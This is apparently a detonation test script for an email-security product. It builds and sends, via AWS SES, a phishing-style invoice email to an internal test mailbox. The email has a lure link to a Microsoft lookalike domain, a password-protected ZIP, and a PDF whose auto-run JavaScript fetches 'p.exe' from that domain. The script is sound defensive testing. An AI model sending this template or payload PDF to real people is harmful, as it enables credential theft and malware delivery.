"""
Detonation end-to-end test — sends ONE email to the actively-synced Google
Workspace mailbox with a suspicious URL + two real attachments crafted to
trigger distinct OSS detonator tools:

  1. Invoice_Q2_2026.pdf     -> /OpenAction + /JavaScript   (pdf scan: malicious)
  2. Payslip_August_2026.zip -> password-encrypted archive  (7z scan: encrypted_archive)

Plus a credential-harvesting-style link in the body (Chromium URL detonation).

Sends via AWS SES (verified identity helios-test-attacker@himaya.ai).
Run: python3 scripts/send_detonation_test.py
"""
import os
import subprocess
import tempfile
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

TARGET = os.getenv("DETON_TEST_TARGET", "adnan@himaya.ai")
SENDER = "helios-test-attacker@himaya.ai"
SES_REGION = "us-east-1"

# Suspicious lookalike URL (gets flagged -> detonated) + a real login-form page
# so the Chromium detonation demonstrably detects input[type=password].
PHISH_URL = "http://microsoft-account-verify-support.com/login?user=adnan"
LOGIN_FORM_URL = "https://the-internet.herokuapp.com/login"

# ── Attachment 1: minimal PDF with auto-run JavaScript ────────────────────────
PDF_BYTES = (
    b"%PDF-1.5\n"
    b"1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction 4 0 R>>endobj\n"
    b"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
    b"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj\n"
    b"4 0 obj<</Type/Action/S/JavaScript/JS(app.alert('Enable content to view invoice');"
    b"var w=this.getURL('http://microsoft-account-verify-support.com/p.exe');)>>endobj\n"
    b"trailer<</Root 1 0 R>>\n"
    b"%%EOF\n"
)


def _make_encrypted_zip() -> bytes:
    """Create a password-protected ZIP (ZipCrypto) so the detonator flags it as
    an encrypted archive. Uses the system `zip -P`."""
    d = tempfile.mkdtemp(prefix="deton_")
    inner = os.path.join(d, "Payslip_August_2026.docx")
    with open(inner, "wb") as f:
        f.write(b"PK\x03\x04 dummy payroll document contents for detonation test\n")
    out = os.path.join(d, "Payslip_August_2026.zip")
    subprocess.run(["zip", "-j", "-P", "Infected2026", out, inner],
                   check=True, capture_output=True)
    with open(out, "rb") as f:
        return f.read()


HTML = f"""<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;color:#333;">
<p>Dear Adnan,</p>
<p>Please find attached the <strong>Q2 2026 invoice</strong> and your
<strong>August payslip</strong> (password: <code>Infected2026</code>).</p>
<p>To review the flagged charge you must verify your account:
<a href="{PHISH_URL}">Verify your Microsoft account</a>.</p>
<p>Secure portal: <a href="{LOGIN_FORM_URL}">{LOGIN_FORM_URL}</a></p>
<p style="font-size:11px;color:#999;">The invoice PDF requires enabling content to display correctly.</p>
</body></html>"""

TEXT = (
    "Dear Adnan, attached are the Q2 2026 invoice and your August payslip "
    f"(password: Infected2026). Verify your account: {PHISH_URL} "
    f"Secure portal: {LOGIN_FORM_URL}"
)


def main():
    msg = MIMEMultipart("mixed")
    msg["Subject"] = "Invoice Q2 2026 + August Payslip — Action Required"
    msg["From"] = f"Accounts Payable <{SENDER}>"
    msg["To"] = TARGET
    msg["Reply-To"] = "billing@microsoft-account-verify-support.com"
    msg["X-Helios-Test"] = "detonation-e2e-2026"
    msg["X-Originating-IP"] = "91.108.4.227"

    alt = MIMEMultipart("alternative")
    alt.attach(MIMEText(TEXT, "plain"))
    alt.attach(MIMEText(HTML, "html"))
    msg.attach(alt)

    pdf = MIMEApplication(PDF_BYTES, _subtype="pdf")
    pdf.add_header("Content-Disposition", "attachment", filename="Invoice_Q2_2026.pdf")
    msg.attach(pdf)

    zip_bytes = _make_encrypted_zip()
    z = MIMEApplication(zip_bytes, _subtype="zip")
    z.add_header("Content-Disposition", "attachment", filename="Payslip_August_2026.zip")
    msg.attach(z)

    import base64 as _b64
    import json as _json
    b64 = _b64.b64encode(msg.as_string().encode()).decode()
    raw_json_path = os.path.join(tempfile.mkdtemp(prefix="deton_eml_"), "raw.json")
    with open(raw_json_path, "w") as f:
        _json.dump({"Data": b64}, f)

    out = subprocess.run(
        ["aws", "ses", "send-raw-email", "--region", SES_REGION,
         "--source", SENDER, "--destinations", TARGET,
         "--raw-message", f"file://{raw_json_path}"],
        capture_output=True, text=True,
    )
    if out.returncode != 0:
        print(f"SEND FAILED (rc={out.returncode})\nSTDOUT={out.stdout}\nSTDERR={out.stderr}")
        raise SystemExit(1)
    print(f"SENT to {TARGET} | {out.stdout.strip()}")
    print(f"  attachments: Invoice_Q2_2026.pdf ({len(PDF_BYTES)}B, JS/OpenAction), "
          f"Payslip_August_2026.zip ({len(zip_bytes)}B, encrypted)")
    print(f"  urls: {PHISH_URL} ; {LOGIN_FORM_URL}")


if __name__ == "__main__":
    main()
